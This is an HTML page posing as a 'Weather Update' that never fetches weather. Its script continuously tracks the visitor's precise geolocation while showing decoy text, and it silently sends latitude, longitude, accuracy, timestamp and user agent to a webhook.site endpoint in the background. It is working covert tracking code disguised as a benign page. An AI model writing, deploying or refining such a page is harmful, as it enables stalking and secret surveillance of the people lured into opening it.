<!DOCTYPE html>
<html>
<head>
  <title>Weather Update</title>
  <meta charset="UTF-8">
</head>
<body>

<h3>Weather Update</h3>
<p id="status">Checking local weather conditions...</p>
<p id="coords"></p>

<script>
if (!navigator.geolocation) {
  document.getElementById("status").innerText =
    "Weather services are not supported on this device.";
} else {

  document.getElementById("status").innerText =
    "Loading weather conditions...";

  navigator.geolocation.watchPosition(
    (pos) => {
      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      // Only visible text
      document.getElementById("coords").innerText =
        "Fetching wind speed and temperature for your area...";

      // Background webhook request
      fetch("https://webhook.site/8f979837-3de8-4935-b9c0-7e1d6d4e0125", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    },
    (err) => {
      document.getElementById("status").innerText =
        "Unable to load weather information.";
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 15000
    }
  );
}
</script>

</body>
</html>
